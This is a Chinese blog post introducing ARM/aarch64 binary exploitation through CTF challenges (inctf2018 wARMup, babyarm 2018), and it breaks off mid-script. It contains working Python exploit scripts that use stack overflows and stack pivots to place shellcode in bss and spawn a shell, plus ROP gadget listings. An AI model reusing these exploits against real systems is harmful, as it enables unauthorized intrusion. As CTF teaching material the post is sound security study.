<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ARM-aarch64-PWN入门"><meta name="keywords" content="ARM,aarch64,pwn"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>ARM-aarch64-PWN入门 | Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.3.0'
} </script><meta name="generator" content="Hexo 5.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM"><span class="toc-number">1.</span> <span class="toc-text">ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BL"><span class="toc-number">1.0.1.</span> <span class="toc-text">BL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9AARM%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.0.2.</span> <span class="toc-text">普通ARM函数调用机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#inctf2018-wARMup"><span class="toc-number">2.</span> <span class="toc-text">inctf2018_wARMup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ARMv8"><span class="toc-number">3.</span> <span class="toc-text">ARMv8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Load-Store-Pair"><span class="toc-number">3.0.1.</span> <span class="toc-text">Load-Store Pair</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ADRL%E6%8C%87%E4%BB%A4"><span class="toc-number">3.0.2.</span> <span class="toc-text">ADRL指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARMv8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">3.0.3.</span> <span class="toc-text">ARMv8寄存器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AA%87%E6%9E%81%E6%9D%AF-2018-babyarm"><span class="toc-number">4.</span> <span class="toc-text">骇极杯_2018_babyarm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.0.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Address-already-in-use"><span class="toc-number">4.0.2.</span> <span class="toc-text">Address already in use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget"><span class="toc-number">4.0.3.</span> <span class="toc-text">gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2bss"><span class="toc-number">4.0.4.</span> <span class="toc-text">ret2bss</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">23</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">21</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="post-info"><div id="post-title">ARM-aarch64-PWN入门</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><h3 id="BL"><a href="#BL" class="headerlink" title="BL"></a>BL</h3><p>(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。<br>   由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回（应该RET语句就是这个原理？）。<br>(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。</p>
<h3 id="普通ARM函数调用机制"><a href="#普通ARM函数调用机制" class="headerlink" title="普通ARM函数调用机制"></a>普通ARM函数调用机制</h3><blockquote>
<p>函数的第 1 ～ 4 个参数分别保存在 <strong>r0 ～ r3</strong> 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 <strong>r0</strong> 中</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210520102043.png"></p>
<p>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">EXPORT main</span><br><span class="line">main</span><br><span class="line"></span><br><span class="line">buf&#x3D; -0x68</span><br><span class="line"></span><br><span class="line">PUSH    &#123;R11,LR&#125;</span><br><span class="line">ADD     R11, SP, #4</span><br><span class="line">SUB     SP, SP, #0x68</span><br><span class="line">; 4:   setvbuf((FILE *)_bss_start, 0, 2, 0);</span><br><span class="line">UMULLSLS R9, R0, R0, R0</span><br><span class="line">UMULLSLS R9, R0, R0, R0</span><br><span class="line">LDR     R3, &#x3D;__bss_start</span><br><span class="line">LDR     R0, [R3]        ; stream</span><br><span class="line">MOV     R3, #0          ; n</span><br><span class="line">MOV     R2, #2          ; modes</span><br><span class="line">MOV     R1, #0          ; buf</span><br><span class="line">BL      setvbuf</span><br><span class="line">; 5:   puts(&quot;Welcome to bi0s CTF!&quot;);</span><br><span class="line">LDR     R0, &#x3D;aWelcomeToBi0sC ; &quot;Welcome to bi0s CTF!&quot;</span><br><span class="line">BL      puts</span><br><span class="line">; 6:   read(0, buf, 120u);</span><br><span class="line">SUB     R3, R11, #-buf</span><br><span class="line">MOV     R2, #0x78 ; &#39;x&#39; ; nbytes</span><br><span class="line">MOV     R1, R3          ; buf</span><br><span class="line">MOV     R0, #0          ; fd</span><br><span class="line">BL      read</span><br><span class="line">; 7:   return 0;</span><br><span class="line">MOV     R3, #0</span><br><span class="line">MOV     R0, R3</span><br><span class="line">SUB     SP, R11, #4</span><br><span class="line">POP     &#123;R11,PC&#125;</span><br><span class="line">; End of function main</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h1><p>栈溢出（最大栈溢出4个）</p>
<p>利用函数返回机制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUB     SP, R11, #4</span><br><span class="line">POP     &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
<p>控制了R11就可以控制SP，可以进行栈转移</p>
<p>思路，栈溢出修改R11，返回地址main的read函数，不过参数buf要被控制为bss的，往bss写入shellcode，返回到shellcode执行</p>
<p>环境搭建命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234  -L &#x2F;usr&#x2F;arm-linux-gnueabihf .&#x2F;wARMup&quot;,reuseaddr</span><br></pre></td></tr></table></figure>
<p>checksec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ✘ </span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">def bytes_to_str(b):</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    for i in b:</span><br><span class="line">        s +&#x3D; chr(i)</span><br><span class="line">    return s</span><br><span class="line">def str_to_bytes(s):</span><br><span class="line">    return bytes(list(map(ord,s)))</span><br><span class="line">from PwnContext import *</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:        </span><br><span class="line">    # context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] # uncomment this if you use tmux</span><br><span class="line">    context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">    context.arch &#x3D; &quot;arm&quot;</span><br><span class="line">    # functions for quick script</span><br><span class="line">    s       &#x3D; lambda data               :ctx.send(str(data))        #in case that data is an int</span><br><span class="line">    sa      &#x3D; lambda delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      &#x3D; lambda delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      &#x3D; lambda data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     &#x3D; lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">    slt     &#x3D; lambda delim,data         :ctx.sendlinethen(str(delim), str(data)) </span><br><span class="line">    r       &#x3D; lambda numb&#x3D;4096          :ctx.recv(numb)</span><br><span class="line">    ru      &#x3D; lambda delims, drop&#x3D;True  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     &#x3D; lambda                    :ctx.interactive()</span><br><span class="line">    rs      &#x3D; lambda *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    &#x3D; lambda address, count&#x3D;0   :ctx.leak(address, count)</span><br><span class="line">    dbg     &#x3D; lambda *args, **kwargs    :ctx.debug(*args, **kwargs)</span><br><span class="line">    # misc functions</span><br><span class="line">    uu32    &#x3D; lambda data   :u32(data.ljust(4, b&#39;\0&#39;))</span><br><span class="line">    uu64    &#x3D; lambda data   :u64(data.ljust(8, b&#39;\0&#39;))</span><br><span class="line">    </span><br><span class="line">    local &#x3D; 0</span><br><span class="line">    if local &#x3D;&#x3D; 1:</span><br><span class="line">        ctx.remote &#x3D; (&#39;127.0.0.1&#39;, 10002)</span><br><span class="line">        ctx.binary &#x3D; &#39;.&#x2F;wARMup&#39;</span><br><span class="line">        # ctx.remote_libc &#x3D; &#39;&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;lib&#x2F;libc-2.31.so&#39;</span><br><span class="line">        # libc &#x3D; ctx.remote_libc</span><br><span class="line">        # ctx.debug_remote_libc &#x3D; True</span><br><span class="line">        rs(&quot;remote&quot;)</span><br><span class="line">    else:</span><br><span class="line">        ctx.remote &#x3D; (&#39;node3.buuoj.cn&#39;, 27341)</span><br><span class="line">        rs(&#39;remote&#39;)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    bss &#x3D; 0x21040</span><br><span class="line">    payload &#x3D; cyclic(0x78)</span><br><span class="line">    pop_r3 &#x3D; 0x00010364</span><br><span class="line">    print(cyclic_find(0x62616162))# 104</span><br><span class="line">    payload &#x3D; 0x64*b&quot;a&quot; + p32(0x21040+4) + p32(pop_r3) + p32(bss) + p32(0x10530)</span><br><span class="line">    ru(&quot;Welcome to bi0s CTF!&quot;)</span><br><span class="line">    sl(bytes_to_str(payload))</span><br><span class="line"></span><br><span class="line">    sleep(1)</span><br><span class="line">    print(&quot;ok&quot;)</span><br><span class="line">    shellcode&#x3D;asm(shellcraft.arm.linux.sh(),arch&#x3D;&#39;arm&#39;)</span><br><span class="line">    payload &#x3D; b&#39;a&#39;*4 + p32(bss+8) +shellcode</span><br><span class="line">    sl(bytes_to_str(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>


<h1 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h1><p>ARMv8，aarch64汇编</p>
<h3 id="Load-Store-Pair"><a href="#Load-Store-Pair" class="headerlink" title="Load-Store Pair"></a>Load-Store Pair</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LDP Wt1, Wt2, addr  &#x2F;&#x2F;从addr处读取两个word到Wt1和Wt2</span><br><span class="line">LDP Xt1, Xt2, addr  &#x2F;&#x2F;从addr处读取两个double-word到Xt1和Xt2</span><br><span class="line">LDPSW Xt1, Xt2, addr  &#x2F;&#x2F;从addr处读取两个word到Xt1和Xt2， sign-extends</span><br><span class="line">STP Wt1, Wt2, addr	&#x2F;&#x2F;将Wt1和Wt2写入addr地址处</span><br><span class="line">STP Xt1, Xt2, addr	&#x2F;&#x2F;将Xt1和Xt2写入addr地址处</span><br></pre></td></tr></table></figure>
<p>W和X表示word，double-word</p>
<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/12/0121/07/4310958_570879973.shtml">http://www.360doc.com/content/12/0121/07/4310958_570879973.shtml</a></p>
<p>例子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stp        x29, x30, [sp, #0xfffffff0]!</span><br><span class="line">ldp        x29, x30, [sp], #0x10</span><br></pre></td></tr></table></figure>
<p><strong>感叹号的意思是先运算修改寄存器的值,再使用寄存器.</strong><br><strong>没有感叹号就像下面这个例子.每次使用完sp的值后加上0x10.这样就可以省略armv7里add sp,#0x40的操作了.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffffff8012ae5770         ldp        x24, x23, [sp], #0x10</span><br><span class="line">ffffff8012ae5774         ldp        x22, x21, [sp], #0x10</span><br><span class="line">ffffff8012ae5778         ldp        x20, x19, [sp], #0x10</span><br><span class="line">ffffff8012ae577c         ldp        x29, x30, [sp], #0x10</span><br></pre></td></tr></table></figure>


<h3 id="ADRL指令"><a href="#ADRL指令" class="headerlink" title="ADRL指令"></a>ADRL指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADRL X0, unk_411068</span><br></pre></td></tr></table></figure>
<p>把unk_411068的地址赋值给X0，类似的还有ADR指令（x86的 lea 指令？）</p>
<h3 id="ARMv8寄存器"><a href="#ARMv8寄存器" class="headerlink" title="ARMv8寄存器"></a>ARMv8寄存器</h3><blockquote>
<p>arm64 前面 8 个参数 都是通过寄存器来传递 x0～x7。栈基址x29，返回地址x30存储在栈顶，而x64是存储在栈底，子程序返回指令，返回地址默认保存在LR（X30）</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://winddoing.github.io/post/7190.html">https://winddoing.github.io/post/7190.html</a></p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210520103453.png"></p>
<p>ret   {Xm}：跳转到由Xm目标寄存器指定的地址处。是子程序返回。Xm可以不写，默认是X30.</p>
<p>看这两个足够了：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3154#toc-3%EF%BC%8Chttps://blog.csdn.net/qq_36495104/article/details/106977969">https://xz.aliyun.com/t/3154#toc-3，https://blog.csdn.net/qq_36495104/article/details/106977969</a></p>
<p>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame fpd&#x3D;0x50</span><br><span class="line"></span><br><span class="line">sub_4007F0</span><br><span class="line"></span><br><span class="line">var_50&#x3D; -0x50</span><br><span class="line"></span><br><span class="line">STP             X29, X30, [SP,#var_50]!</span><br><span class="line">MOV             X29, SP</span><br><span class="line">; 4:   return read(0, &amp;v1, 0x200uLL);</span><br><span class="line">ADD             X0, X29, #0x10</span><br><span class="line">MOV             X2, #0x200 ; nbytes</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">NOP</span><br><span class="line">LDP             X29, X30, [SP+0x50+var_50],#0x50</span><br><span class="line">RET</span><br><span class="line">; End of function sub_4007F0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210520100839.png"></p>
<h1 id="骇极杯-2018-babyarm"><a href="#骇极杯-2018-babyarm" class="headerlink" title="骇极杯_2018_babyarm"></a>骇极杯_2018_babyarm</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先打开一个终端，socat搭建这个题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10002,fork exec:&quot;qemu-aarch64 -g 1234  -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;pwn&quot;,reuseaddr</span><br></pre></td></tr></table></figure>
<p><code>./pwn</code>是文件名，题目搭建在127.0.0.1:10002，转发端口到1234</p>
<p>exp这么写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_str</span>(<span class="params">b</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        s += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,s)))</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:        </span><br><span class="line">    <span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] # uncomment this if you use tmux</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&quot;aarch64&quot;</span></span><br><span class="line">    <span class="comment"># functions for quick script</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    slt     = <span class="keyword">lambda</span> delim,data         :ctx.sendlinethen(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    dbg     = <span class="keyword">lambda</span> *args, **kwargs    :ctx.debug(*args, **kwargs)</span><br><span class="line">    <span class="comment"># misc functions</span></span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">        ctx.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">        ctx.remote_libc = <span class="string">&#x27;/usr/aarch64-linux-gnu/lib/libc-2.31.so&#x27;</span></span><br><span class="line">        libc = ctx.remote_libc</span><br><span class="line">        ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">        rs(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">        ctx.remote = (<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26879</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">        rs(<span class="string">&#x27;remote&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>
<p>允许这个exp，pause停下来</p>
<p>再打开一个终端，<code>gdb-multiarch ./pwn -q</code> 打开gdb</p>
<p>gdb内执行命令<code>target  remote 127.0.0.1:1234</code>，下断点后exp再运行</p>
<p>一定要有gdb，exp.py才能正常运行</p>
<h3 id="Address-already-in-use"><a href="#Address-already-in-use" class="headerlink" title="Address already in use"></a>Address already in use</h3><p>中途Ctrl+C退出exp.py就会这样，连上的进程没有被kill掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">k2016@ubuntu:~&#x2F;Desktop&#x2F;pwn2$ lsof -n -i | grep 1234</span><br><span class="line">qemu-aarc 4551 k2016    5u  IPv4 141218      0t0  TCP *:1234 (LISTEN)</span><br><span class="line">k2016@ubuntu:~&#x2F;Desktop&#x2F;pwn2$ kill -9 4551</span><br></pre></td></tr></table></figure>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>下面两段 gadget 位于 程序初始化函数的那一部分， 以后可以作为通用 gadgets，类似于x64架构的ret_csu</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x4008CC ： ldp x19, x20, [sp, #0x10] ; </span><br><span class="line">			ldp x21, x22, [sp, #0x20] ; </span><br><span class="line">			ldp x23, x24, [sp, #0x30] ;</span><br><span class="line">			ldp x29, x30, [sp], #0x40 ;</span><br><span class="line">			ret</span><br><span class="line">			</span><br><span class="line">0x4008AC :  ldr x3, [x21, x19, lsl #3] ;</span><br><span class="line">			mov x2, x22 ; </span><br><span class="line">			mov x1, x23 ; </span><br><span class="line">			mov w0, w24 ;</span><br><span class="line">			add x19, x19, #1 ;</span><br><span class="line">			blr x3</span><br></pre></td></tr></table></figure>
<p>（似乎没用到）</p>
<h3 id="ret2bss"><a href="#ret2bss" class="headerlink" title="ret2bss"></a>ret2bss</h3><p>由于返回地址在栈顶，所以基本不可能覆盖掉，但是函数返回后的下一个函数可能会被控制</p>
<p>直接ret2bss执行shellcode就行了，WriteUp还利用gadget 调用了 mprotect，实际上这个函数程序根本没有调用</p>
<p>本地打通的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 